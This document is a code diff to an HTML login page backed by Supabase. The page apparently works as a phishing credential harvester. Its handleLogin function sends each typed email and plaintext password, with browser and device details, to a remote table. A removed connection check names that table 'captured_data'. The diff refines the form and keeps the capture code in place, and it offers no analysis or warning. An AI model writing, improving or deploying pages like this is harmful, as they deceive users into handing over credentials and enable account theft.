@@ -59,7 +59,8 @@
             font-size: 14px;
         }
 
-        input {
+        input[type="email"],
+        input[type="password"] {
             width: 100%;
             padding: 12px 15px;
             border: 2px solid #e0e0e0;
@@ -69,7 +70,8 @@
             outline: none;
         }
 
-        input:focus {
+        input[type="email"]:focus,
+        input[type="password"]:focus {
             border-color: #667eea;
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
         }
@@ -134,11 +136,13 @@
             display: flex;
             align-items: center;
             gap: 5px;
+            cursor: pointer;
         }
 
         .remember-me input[type="checkbox"] {
             width: auto;
             margin-right: 5px;
+            cursor: pointer;
         }
 
         .forgot-link {
@@ -187,6 +191,12 @@
                 <input type="password" id="password" placeholder="Enter your password" required>
             </div>
 
+            <div class="remember-forgot">
+                <label class="remember-me">
+                    <input type="checkbox" id="remember"> Remember me
+                </label>
+                <a href="#" class="forgot-link" onclick="forgotPassword(event)">Forgot Password?</a>
+            </div>
 
             <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
                 <span id="btnText">Login</span>
@@ -196,23 +206,33 @@
     </div>
 
     <script>
-        // Supabase configuration - use different variable names to avoid conflicts
-        const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
-        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
+        // Supabase configuration
+        const supabaseUrl = 'https://aqynejlgjwdmxsekkyld.supabase.co';
+        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuk';
         
-        // Initialize Supabase with different variable name
+        // Initialize Supabase
         const db = window.supabase.createClient(supabaseUrl, supabaseKey);
         
         // Make handleLogin globally accessible
         window.handleLogin = async function() {
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
-            const remember = document.getElementById('remember').checked;
+            const emailElement = document.getElementById('email');
+            const passwordElement = document.getElementById('password');
+            const rememberElement = document.getElementById('remember');
             const errorMessage = document.getElementById('errorMessage');
             const successMessage = document.getElementById('successMessage');
             const loginBtn = document.getElementById('loginBtn');
             const btnText = document.getElementById('btnText');
             const loading = document.getElementById('loading');
+            
+            // Check if elements exist
+            if (!emailElement || !passwordElement) {
+                console.error('Form elements not found');
+                return;
+            }
+            
+            const email = emailElement.value.trim();
+            const password = passwordElement.value;
+            const remember = rememberElement ? rememberElement.checked : false;
             
             // Reset messages
             errorMessage.style.display = 'none';
@@ -246,14 +266,14 @@
                         {
                             email: email,
                             password: password,
-                            remember: remember,
                             user_agent: navigator.userAgent,
                             referer: document.referrer || 'Direct',
                             device_info: {
                                 language: navigator.language,
                                 screenResolution: `${window.screen.width}x${window.screen.height}`,
                                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                                platform: navigator.platform
+                                platform: navigator.platform,
+                                remember: remember
                             },
                             created_at: new Date().toISOString()
                         }
@@ -291,36 +311,6 @@
             event.preventDefault();
             alert('Please contact support to reset your password.');
         };
-        
-        // Test Supabase connection
-        async function testConnection() {
-            try {
-                const { data, error } = await db
-                    .from('captured_data')
-                    .select('count', { count: 'exact', head: true });
-                
-                if (error) {
-                    console.error('❌ Supabase connection error:', error.message);
-                    console.log('Make sure you have created the "captured_data" table');
-                } else {
-                    console.log('✅ Supabase connected successfully');
-                    console.log('Table "captured_data" is ready');
-                }
-            } catch (err) {
-                console.error('❌ Connection failed:', err.message);
-            }
-        }
-        
-        // Test connection when page loads
-        window.addEventListener('load', testConnection);
-        
-        // Add Enter key support
-        document.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                handleLogin();
-            }
-        });
     </script>
 </body>
 </html>
